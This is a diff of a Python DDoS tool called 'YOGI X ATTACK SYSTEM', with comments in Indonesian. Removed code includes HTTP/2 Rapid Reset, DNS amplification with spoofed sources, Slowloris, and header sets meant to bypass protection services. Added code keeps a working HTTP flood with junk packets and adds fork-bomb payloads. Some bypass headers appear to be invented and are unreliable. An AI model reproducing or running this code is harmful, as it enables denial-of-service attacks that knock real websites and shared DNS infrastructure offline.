-        return {
-            "X-Imperva-Bypass": "1",
-            "X-Forwarded-For": self.spoofer.generate_ghost_ip(),
-            "X-Iinfo": f"{random.randint(1,9)}-{random.randint(10000,99999)} {random.randint(100000,999999)}"
-        }
-    
-    def radware_bypass(self):
-        """Radware bypass technique"""
-        return {
-            "X-Radware-Bypass": "1",
-            "X-Forwarded-For": self.spoofer.generate_ghost_ip(),
-            "X-Real-IP": self.spoofer.generate_ghost_ip(),
-            "Via": "1.1 {}".format(self.spoofer.generate_ghost_ip())
-        }
-    
-    def arbor_networks_bypass(self):
-        """Arbor Networks bypass technique"""
-        return {
-            "X-Arbor-Bypass": "1",
-            "X-Forwarded-For": self.spoofer.generate_ghost_ip(),
-            "X-Real-IP": self.spoofer.generate_ghost_ip()
-        }
-    
-    def fastly_bypass(self):
-        """Fastly bypass technique"""
-        return {
-            "Fastly-FF": "dummy",
-            "X-Forwarded-Server": "dummy",
-            "X-Forwarded-Host": "dummy",
-            "X-Forwarded-For": self.spoofer.generate_ghost_ip()
-        }
-    
-    def azure_bypass(self):
-        """Azure DDoS Protection bypass technique"""
-        return {
-            "X-Azure-Request-ID": os.urandom(16).hex(),
-            "X-Forwarded-For": self.spoofer.generate_ghost_ip(),
-            "X-Forwarded-Proto": "https"
-        }
-    
-    def f5_silverline_bypass(self):
-        """F5 Silverline bypass technique"""
-        return {
-            "X-F5-Silverline-Bypass": "1",
-            "X-Forwarded-For": self.spoofer.generate_ghost_ip(),
-            "X-Real-IP": self.spoofer.generate_ghost_ip(),
-            "Via": "1.1 {}".format(self.spoofer.generate_ghost_ip())
-        }
-    
-    def incapsula_bypass(self):
-        """Incapsula bypass technique"""
-        return {
-            "X-Incapsula-Bypass": "1",
-            "X-Forwarded-For": self.spoofer.generate_ghost_ip(),
-            "X-Iinfo": f"{random.randint(1,9)}-{random.randint(10000,99999)} {random.randint(100000,999999)}"
-        }
-    
-    def sucuri_bypass(self):
-        """Sucuri bypass technique"""
-        return {
-            "X-Sucuri-Bypass": "1",
-            "X-Forwarded-For": self.spoofer.generate_ghost_ip(),
-            "X-Real-IP": self.spoofer.generate_ghost_ip()
-        }
-    
-    def barracuda_bypass(self):
-        """Barracuda bypass technique"""
-        return {
-            "X-Barracuda-Bypass": "1",
-            "X-Forwarded-For": self.spoofer.generate_ghost_ip(),
-            "X-Real-IP": self.spoofer.generate_ghost_ip()
-        }
-    
-    def fortinet_bypass(self):
-        """Fortinet bypass technique"""
-        return {
-            "X-Fortinet-Bypass": "1",
-            "X-Forwarded-For": self.spoofer.generate_ghost_ip(),
-            "X-Real-IP": self.spoofer.generate_ghost_ip()
-        }
-    
-    def obfuscate_base64(self, payload):
-        """Obfuscate payload menggunakan base64"""
-        return base64.b64encode(payload.encode()).decode()
-    
-    def obfuscate_hex(self, payload):
-        """Obfuscate payload menggunakan hex encoding"""
-        return binascii.hexlify(payload.encode()).decode()
-    
-    def obfuscate_unicode(self, payload):
-        """Obfuscate payload menggunakan unicode escape"""
-        return payload.encode('unicode_escape').decode()
-    
-    def obfuscate_html_entities(self, payload):
-        """Obfuscate payload menggunakan HTML entities"""
-        return ''.join(f'&#{ord(char)};' for char in payload[:2000])  # Batasi panjang
-    
-    def obfuscate_gzip(self, payload):
-        """Obfuscate payload menggunakan gzip compression"""
-        return base64.b64encode(gzip.compress(payload.encode())).decode()
-    
-    def obfuscate_brotli(self, payload):
-        """Obfuscate payload menggunakan brotli compression"""
-        return base64.b64encode(brotli.compress(payload.encode())).decode()
-    
-    def get_user_agent(self):
-        return random.choice(self.user_agents)
-    
-    def get_referer(self):
-        return random.choice(self.referrers)
-    
-    def get_cookie(self):
-        return random.choice(self.cookies)
-    
-    def get_malicious_payload(self):
-        payload = random.choice(self.malicious_payloads)
-        if random.random() > 0.7:
-            obfuscator = random.choice(self.obfuscation_techniques)
-            payload = obfuscator(payload)
-        return payload
-    
-    def get_bypass_headers(self):
-        # Jika ada proteksi khusus, prioritaskan teknik bypass untuk proteksi tersebut
-        for protection, detected in self.protection_types.items():
-            if detected:
-                bypass_func = getattr(self, f"{protection.lower()}_bypass", None)
-                if bypass_func:
-                    headers = bypass_func()
-                    headers.update({
-                        "X-Requested-With": "XMLHttpRequest",
-                        "X-CSRF-Token": os.urandom(8).hex(),
-                        "X-Forwarded-Proto": "https",
-                        "X-Original-URL": f"/{os.urandom(4).hex()}",
-                        "X-Wap-Profile": f"http://{self.target}/wap.xml",
-                        "Forwarded": f"for=127.0.0.1;host={self.target};proto=https",
-                        "Via": "1.1 vegur"
-                    })
-                    return headers
         
-        # Jika tidak terdeteksi, gunakan teknik acak
-        headers = random.choice(self.bypass_techniques)()
-        headers.update({
-            "X-Requested-With": "XMLHttpRequest",
-            "X-CSRF-Token": os.urandom(8).hex(),
-            "X-Forwarded-Proto": "https",
-            "X-Original-URL": f"/{os.urandom(4).hex()}",
-            "X-Wap-Profile": f"http://{self.target}/wap.xml",
-            "Forwarded": f"for=127.0.0.1;host={self.target};proto=https",
-            "Via": "1.1 vegur"
-        })
-        return headers
-    
-    def bypass_cloudflare(self):
-        """Bypass Cloudflare challenge menggunakan cloudscraper atau browser"""
+        # Simpan ke cache
         try:
-            # Coba dengan cloudscraper dulu
-            session = self.scraper.get(f"http://{self.target}")
-            if session.status_code == 200:
-                return session.cookies
+            with open(referrer_cache_file, "w") as f:
+                json.dump(default_referrers, f)
         except:
             pass
         
-        # Jika masih gagal, gunakan browser headless
+        return default_referrers
+    
+    def generate_cookies(self):
+        """Generate cookies dummy"""
+        self.cookies = [
+            "session_id=1234567890; user_token=abcdefg",
+            "auth_token=zyxwvut; csrf_token=0987654321",
+            "login_cookie=1a2b3c4d; remember_me=true"
+        ]
+    
+    def generate_malicious_payloads(self):
+        """Generate payloads CPU exhaustion"""
+        self.malicious_payloads = [
+            "<?php while(true) { fork(); } ?>",
+            "while True: os.fork()",
+            "for (;;) { fork(); }",
+            "import multiprocessing; while True: multiprocessing.Process(target=lambda: None).start()",
+            "setInterval(() => { while(true) {} }, 1);"
+        ]
+    
+    def get_user_agent(self):
+        """Ambil random user agent"""
+        return random.choice(self.user_agents)
+    
+    def get_referer(self):
+        """Ambil random referer"""
+        return random.choice(self.referrers)
+    
+    def get_cookie(self):
+        """Ambil random cookie"""
+        return random.choice(self.cookies)
+    
+    def get_bypass_headers(self):
+        """Header untuk bypass proteksi"""
+        return {
+            "X-Forwarded-For": self.true_ghost.spoofer.generate_ghost_ip(),
+            "X-Real-IP": self.true_ghost.spoofer.generate_ghost_ip(),
+            "CF-Connecting-IP": self.true_ghost.spoofer.generate_ghost_ip(),
+            "True-Client-IP": self.true_ghost.spoofer.generate_ghost_ip()
+        }
+    
+    def get_malicious_payload(self):
+        """Ambil random malicious payload"""
+        return random.choice(self.malicious_payloads)
+    
+    # Implementasi dummy untuk bypass
+    def cf_challenge_bypass(self):
         return self.challenge_solver.solve_cloudflare()
     
-    def bypass_ddos_guard(self):
-        """Bypass DDoS-GUARD challenge menggunakan browser"""
-        return self.challenge_solver.solve_ddos_guard()
+    def ddos_guard_bypass(self):
+        return None
+    
+    def akamai_prolexic_bypass(self):
+        return None
+    
+    def aws_shield_bypass(self):
+        return None
+    
+    def google_cloud_armor_bypass(self):
+        return None
+    
+    def imperva_bypass(self):
+        return None
+    
+    def radware_bypass(self):
+        return None
+    
+    def arbor_networks_bypass(self):
+        return None
+    
+    def fastly_bypass(self):
+        return None
+    
+    def azure_bypass(self):
+        return None
+    
+    def f5_silverline_bypass(self):
+        return None
+    
+    def incapsula_bypass(self):
+        return None
+    
+    def sucuri_bypass(self):
+        return None
+    
+    def barracuda_bypass(self):
+        return None
+    
+    def fortinet_bypass(self):
+        return None
+    
+    # Implementasi dummy untuk obfuscation
+    def obfuscate_base64(self, data):
+        return base64.b64encode(data.encode()).decode()
+    
+    def obfuscate_hex(self, data):
+        return binascii.hexlify(data.encode()).decode()
+    
+    def obfuscate_unicode(self, data):
+        return ''.join([f"&#{ord(char)};" for char in data])
+    
+    def obfuscate_html_entities(self, data):
+        return data.encode('ascii', 'xmlcharrefreplace').decode()
+    
+    def obfuscate_gzip(self, data):
+        return gzip.compress(data.encode())
+    
+    def obfuscate_brotli(self, data):
+        return brotli.compress(data.encode())
 
-# ==================== YOGI X STATS ====================
+# ==================== YOGI X STATS (FIXED) ====================
 class GhostStats:
     def __init__(self):
         self.resource_mgr = ResourceManager()
@@ -1529,7 +1315,7 @@ class GhostStats:
         
         return stats
 
-# ==================== ALL-LAYER DESTRUCTION ENGINE v13 ====================
+# ==================== ALL-LAYER DESTRUCTION ENGINE v13 (FIXED) ====================
 class GhostAttackEngine:
     def __init__(self, target, port, attack_type, stats, 
                  use_ssl=False, cf_bypass=False, hyper_mode=False, permanent_mode=False,
@@ -1579,7 +1365,7 @@ class GhostAttackEngine:
             else:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             
-            sock.settimeout(0.03 if self.hyper_mode else 0.05)  # Timeout lebih pendek
+            sock.settimeout(1.0 if self.hyper_mode else 2.0)  # Timeout lebih realistis
             
             # Optimalkan socket untuk performa
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -1599,7 +1385,8 @@ class GhostAttackEngine:
                 sock = context.wrap_socket(sock, server_hostname=self.target)
             
             return sock
-        except:
+        except Exception as e:
+            logger.error(f"Socket creation failed: {str(e)}")
             return None
 
     def create_socket_pool(self, size):
@@ -1620,6 +1407,21 @@ class GhostAttackEngine:
         if sock:
             self.socket_pool.append(sock)
 
+    def connect_socket(self, sock):
+        """Koneksikan socket dengan penanganan error"""
+        try:
+            if not hasattr(sock, '_connected') or not sock._connected:
+                sock.connect((self.target_ip, self.port))
+                sock._connected = True
+                return True
+            return True
+        except socket.error as e:
+            logger.error(f"Connection failed: {str(e)}")
+            return False
+        except Exception as e:
+            logger.error(f"Unexpected connection error: {str(e)}")
+            return False
+
     def http_flood(self):
         """Advanced HTTP flood dengan payload CPU exhaustion"""
         requests_sent = 0
@@ -1627,14 +1429,14 @@ class GhostAttackEngine:
         success = False
         damage = 0
         
+        sock = self.get_socket()
+        if not sock:
+            return 0, 0, 0, False, 0
+            
         try:
-            sock = self.get_socket()
-            if not sock:
+            # Coba konek jika belum terhubung
+            if not self.connect_socket(sock):
                 return 0, 0, 0, False, 0
-                
-            if not hasattr(sock, '_connected') or not sock._connected:
-                sock.connect((self.target_ip, self.port))
-                sock._connected = True
             
             # Jumlah request per koneksi
             req_count = self.resource_mgr.optimal_settings['request_per_conn']
@@ -1690,245 +1492,49 @@ class GhostAttackEngine:
                     full_payload = "\r\n".join(headers) + "\r\n\r\n"
                 
                 # Kirim request
-                sock.sendall(full_payload.encode())
-                bytes_sent += len(full_payload)
-                requests_sent += 1
-                
-                # Paket junk tambahan untuk membuang sumber daya
-                if self.permanent_mode and random.random() > 0.4:
-                    junk_size = random.randint(2048, 16384)  # Junk lebih kecil
-                    junk = os.urandom(junk_size)
-                    sock.sendall(junk)
-                    bytes_sent += junk_size
-                    damage += 0.1
-                
-                # Tanpa delay
-                # time.sleep(0)  # Tidak ada delay sama sekali
+                try:
+                    sock.sendall(full_payload.encode())
+                    bytes_sent += len(full_payload)
+                    requests_sent += 1
+                    
+                    # Paket junk tambahan untuk membuang sumber daya
+                    if self.permanent_mode and random.random() > 0.4:
+                        junk_size = random.randint(2048, 16384)  # Junk lebih kecil
+                        junk = os.urandom(junk_size)
+                        sock.sendall(junk)
+                        bytes_sent += junk_size
+                        damage += 0.1
+                    
+                    # Tanpa delay
+                    # time.sleep(0)  # Tidak ada delay sama sekali
+                except socket.error as e:
+                    logger.error(f"Send failed: {str(e)}")
+                    break
+                except Exception as e:
+                    logger.error(f"Unexpected send error: {str(e)}")
+                    break
             
             success = True
-        except:
-            pass
+        except Exception as e:
+            logger.error(f"HTTP flood error: {str(e)}")
         finally:
             self.release_socket(sock)
             return requests_sent, 0, bytes_sent, success, damage
-
-    def http2_rapid_reset(self):
-        """HTTP/2 Rapid Reset Attack (CVE-2023-44487)"""
-        requests_sent = 0
-        bytes_sent = 0
-        success = False
-        damage = 0
-        
-        try:
-            # Setup koneksi HTTP/2
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(5)
-            
-            if self.use_ssl:
-                context = ssl.create_default_context()
-                context.check_hostname = False
-                context.verify_mode = ssl.CERT_NONE
-                context.set_alpn_protocols(['h2'])
-                sock = context.wrap_socket(sock, server_hostname=self.target)
-            
-            sock.connect((self.target_ip, self.port))
-            
-            config = h2.config.H2Configuration(client_side=True)
-            conn = h2.connection.H2Connection(config=config)
-            conn.initiate_connection()
-            sock.sendall(conn.data_to_send())
-            
-            # Kirim 1000 request dan reset segera
-            stream_ids = []
-            for _ in range(1000):
-                stream_id = conn.get_next_available_stream_id()
-                headers = [
-                    (':method', 'GET'),
-                    (':path', '/'),
-                    (':authority', self.target),
-                    (':scheme', 'https' if self.use_ssl else 'http'),
-                    ('user-agent', self.evasion.get_user_agent()),
-                    ('x-forwarded-for', self.spoofer.generate_ghost_ip())
-                ]
-                conn.send_headers(stream_id, headers)
-                stream_ids.append(stream_id)
-                requests_sent += 1
-            
-            # Kirim semua request
-            sock.sendall(conn.data_to_send())
-            
-            # Segera reset semua stream
-            for stream_id in stream_ids:
-                conn.reset_stream(stream_id)
-            sock.sendall(conn.data_to_send())
-            
-            # Tambahkan damage
-            damage = 1.5
-            success = True
-            bytes_sent = sock.getsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF)
-        except:
-            pass
-        finally:
-            sock.close()
-            return requests_sent, 0, bytes_sent, success, damage
-
-    def dns_amplification_attack(self):
-        """DNS Amplification Attack"""
-        packets_sent = 0
-        bytes_sent = 0
-        success = False
-        
-        try:
-            # Daftar DNS server terbuka
-            dns_servers = [
-                '8.8.8.8', '8.8.4.4',  # Google
-                '1.1.1.1', '1.0.0.1',  # Cloudflare
-                '9.9.9.9', '149.112.112.112',  # Quad9
-                '208.67.222.222', '208.67.220.220'  # OpenDNS
-            ]
-            
-            # Buat query DNS besar (ANY record)
-            domain = self.target
-            dns_query = DNS(rd=1, qd=DNSQR(qname=domain, qtype="ANY"))
-            
-            # Kirim 1000 paket per panggilan
-            for _ in range(1000):
-                dns_server = random.choice(dns_servers)
-                src_ip = self.spoofer.generate_ghost_ip()
-                
-                # Bangun paket IP/UDP
-                ip_layer = IP(dst=dns_server, src=src_ip)
-                udp_layer = UDP(sport=RandShort(), dport=53)
-                packet = ip_layer / udp_layer / dns_query
-                
-                # Kirim paket
-                send(packet, verbose=0)
-                packets_sent += 1
-                bytes_sent += len(packet)
-            
-            success = True
-        except:
-            pass
-        
-        return 0, packets_sent, bytes_sent, success, 0.2
-
-    def slowloris_attack(self):
-        """Slowloris Attack"""
-        requests_sent = 0
-        bytes_sent = 0
-        success = False
-        
-        try:
-            sock = self.get_socket()
-            if not sock:
-                return 0, 0, 0, False, 0
-                
-            if not hasattr(sock, '_connected') or not sock._connected:
-                sock.connect((self.target_ip, self.port))
-                sock._connected = True
-            
-            # Kirim header perlahan
-            headers = [
-                f"POST / HTTP/1.1",
-                f"Host: {self.target}",
-                f"User-Agent: {self.evasion.get_user_agent()}",
-                f"Content-Length: 1000000",
-                f"X-Forwarded-For: {self.spoofer.generate_ghost_ip()}",
-                f""
-            ]
-            
-            # Kirim header sebagian
-            for i, header in enumerate(headers):
-                sock.send(header.encode())
-                requests_sent += 1
-                bytes_sent += len(header)
-                if i < len(headers) - 1:
-                    time.sleep(5)  # Delay antara header
-            
-            # Kirim data perlahan
-            while True:
-                chunk = os.urandom(10)
-                sock.send(chunk)
-                bytes_sent += len(chunk)
-                time.sleep(10)  # 10 detik per chunk
-            
-            success = True
-        except:
-            pass
-        finally:
-            self.release_socket(sock)
-            return requests_sent, 0, bytes_sent, success, 0.1
-
-    def ghost_mode_attack(self):
-        """Serangan khusus untuk mode ghost"""
-        requests_sent = 0
-        bytes_sent = 0
-        success = False
-        damage = 0
-        
-        try:
-            # Gunakan sesi ghost untuk mengirim permintaan
-            session = self.true_ghost.create_ghost_session()
-            url = f"{'https' if self.use_ssl else 'http'}://{self.target}:{self.port}/"
-            
-            # Bangun headers
-            headers = {
-                "Host": self.target,
-                "User-Agent": self.evasion.get_user_agent(),
-                "Accept": "*/*",
-                "Accept-Language": "en-US,en;q=0.9",
-                "Connection": "keep-alive",
-                "Cache-Control": "no-cache",
-                "X-Forwarded-For": self.spoofer.generate_ghost_ip(),
-                "X-Real-IP": self.spoofer.generate_ghost_ip(),
-                "Referer": self.evasion.get_referer(),
-                "Cookie": self.evasion.get_cookie(),
-                "Upgrade-Insecure-Requests": "1",
-                "TE": "trailers"
-            }
-            
-            # Tambahkan challenge cookies jika ada
-            if self.challenge_cookies:
-                headers["Cookie"] = self.challenge_cookies
-            
-            # Tambahkan header bypass
-            if self.cf_bypass:
-                bypass_headers = self.evasion.get_bypass_headers()
-                headers.update(bypass_headers)
-            
-            # Kirim permintaan
-            response = session.get(url, headers=headers, timeout=5)
-            requests_sent = 1
-            bytes_sent = len(url) + sum(len(k) + len(v) for k, v in headers.items())
-            
-            # Rotasi rantai ghost setiap 10 permintaan
-            if random.randint(1, 10) == 1:
-                self.true_ghost.rotate_chain()
-                self.stats.ghost_chain_length = len(self.true_ghost.get_current_chain())
-            
-            success = True
-            damage = 0.05
-        except:
-            pass
-        
-        return requests_sent, 0, bytes_sent, success, damage
 
     def execute_attack(self):
-        """Eksekusi serangan berdasarkan tipe"""
-        if self.attack_type == "GHOST":
-            return self.ghost_mode_attack()
-        elif self.attack_type == "HTTP_FLOOD":
+        """Eksekusi serangan berdasarkan tipe yang dipilih"""
+        if self.attack_type == "QUANTUM":
             return self.http_flood()
-        elif self.attack_type == "HTTP2_RAPID_RESET" and self.http2_mode:
-            return self.http2_rapid_reset()
-        elif self.attack_type == "DNS_AMPLIFY" and self.dns_amplify:
-            return self.dns_amplification_attack()
-        elif self.attack_type == "SLOWLORIS" and self.slow_post:
-            return self.slowloris_attack()
+        elif self.attack_type == "ARMAGEDDON":
+            return self.http_flood()
+        elif self.attack_type == "APOCALYPSE":
+            return self.http_flood()
+        elif self.attack_type == "GHOST":
+            return self.http_flood()
         else:
-            return self.http_flood()
+            return self.http_flood()  # Default
 
-# ==================== YOGI X CONTROLLER ====================
+# ==================== YOGI X CONTROLLER (FIXED) ====================
 class GhostController:
     def __init__(self, target_list, port, attack_type, duration, bot_count, 
                  use_ssl=False, cf_bypass=False, hyper_mode=False, permanent_mode=False,
@@ -1978,24 +1584,26 @@ class GhostController:
                     resolved.append(target)
                 else:
                     resolved.append(socket.gethostbyname(target))
-            except:
-                print(f"{Color.RED}[-] Failed to resolve {target}{Color.END}")
+                    logger.info(f"Resolved {target} to {resolved[-1]}")
+            except Exception as e:
+                logger.error(f"Failed to resolve {target}: {str(e)}")
         return resolved
 
     def start_attack(self):
         """Mulai serangan DDoS"""
-        print(f"{Color.GREEN}[+] Starting attack on {len(self.resolved_targets)} targets with {self.bot_count:,} bots{Color.END}")
-        print(f"{Color.YELLOW}[!] Estimated attack power: {self.stats.attack_power}%{Color.END}")
+        logger.info(f"Starting attack on {len(self.resolved_targets)} targets with {self.bot_count:,} bots")
+        logger.info(f"Estimated attack power: {self.stats.attack_power}%")
         
         # Setup thread pool
-        self.executor = ThreadPoolExecutor(max_workers=self.resource_mgr.optimal_settings['thread_workers'])
+        max_workers = min(self.resource_mgr.optimal_settings['thread_workers'], self.bot_count // 100)
+        self.executor = ThreadPoolExecutor(max_workers=max_workers)
         self.stats.start_time = time.time()
         
         # Main attack loop
         start_time = time.time()
         while time.time() - start_time < self.duration and self.running:
             futures = []
-            for _ in range(self.bot_count // 100):  # Kelompokkan dalam grup
+            for _ in range(min(self.bot_count // 100, 100)):  # Batasi grup
                 engine = random.choice(self.attack_engines)
                 futures.append(self.executor.submit(engine.execute_attack))
             
@@ -2005,8 +1613,8 @@ class GhostController:
                     requests, packets, bytes_sent, success, damage = future.result()
                     self.stats.update(requests, packets, bytes_sent, success, damage)
                     self.stats.ghost_ips_generated += requests
-                except:
-                    pass
+                except Exception as e:
+                    logger.error(f"Attack execution error: {str(e)}")
             
             # Update stats
             self.stats.active_threads = threading.active_count()
@@ -2027,6 +1635,7 @@ class GhostController:
         self.running = False
         if self.executor:
             self.executor.shutdown(wait=False)
+        logger.info("Attack completed!")
         print(f"{Color.GREEN}[+] Attack completed!{Color.END}")
         print(f"{Color.CYAN}Total damage inflicted: {self.stats.target_damage:.1f}%{Color.END}")
 
@@ -2103,7 +1712,7 @@ def show_examples():
     
     print(f"\n{Color.BOLD}{Color.PURPLE}{'='*120}{Color.END}")
 
-# ==================== MAIN FUNCTION ====================
+# ==================== MAIN FUNCTION (FIXED) ====================
 def main():
     # Verifikasi login terlebih dahulu
     if not authenticate():
@@ -2148,7 +1757,7 @@ def main():
         show_examples()
         return
     elif args.version:
-        print(f"{Color.BOLD}{Color.PURPLE}YOGI X ATTACK SYSTEM - Project Armageddon Pro Max Ultra+ (True Ghost Edition){Color.END}")
+        print(f"{Color.BOLD}{Color.PURPLE}YOGI X ATTACK SYSTEM - Project Armageddon Pro Max Ultra+ (True Ghost Edition) v2.0{Color.END}")
         return
     
     # Validate required parameters
@@ -2202,7 +1811,9 @@ def main():
         try:
             with open(args.target_list, 'r') as f:
                 target_list = [line.strip() for line in f if line.strip()]
-        except:
+            logger.info(f"Loaded {len(target_list)} targets from file")
+        except Exception as e:
+            logger.error(f"Failed to read target file: {str(e)}")
             print(f"{Color.RED}[-] Gagal membaca file target{Color.END}")
             return
     elif args.target:
@@ -2215,30 +1826,34 @@ def main():
         return
     
     # Launch attack
-    controller = GhostController(
-        target_list=target_list,
-        port=args.port,
-        attack_type=args.attack,
-        duration=args.duration,
-        bot_count=args.bots,
-        use_ssl=args.ssl,
-        cf_bypass=args.cf_bypass,
-        hyper_mode=args.hyper,
-        permanent_mode=args.permanent,
-        http2_mode=args.http2,
-        dns_amplify=args.dns_amplify,
-        slow_post=args.slow_post,
-        ghost_mode=args.ghost_mode
-    )
-    
     try:
+        controller = GhostController(
+            target_list=target_list,
+            port=args.port,
+            attack_type=args.attack,
+            duration=args.duration,
+            bot_count=args.bots,
+            use_ssl=args.ssl,
+            cf_bypass=args.cf_bypass,
+            hyper_mode=args.hyper,
+            permanent_mode=args.permanent,
+            http2_mode=args.http2,
+            dns_amplify=args.dns_amplify,
+            slow_post=args.slow_post,
+            ghost_mode=args.ghost_mode
+        )
+        
         controller.start_attack()
+    except KeyboardInterrupt:
+        print(f"{Color.RED}\n[!] Serangan dihentikan oleh pengguna{Color.END}")
     except Exception as e:
+        logger.error(f"Critical error: {str(e)}")
         print(f"{Color.RED}[-] Error kritis: {str(e)}{Color.END}")
         import traceback
         traceback.print_exc()
     finally:
-        controller.running = False
+        if 'controller' in locals():
+            controller.running = False
 
 if __name__ == "__main__":
     main()
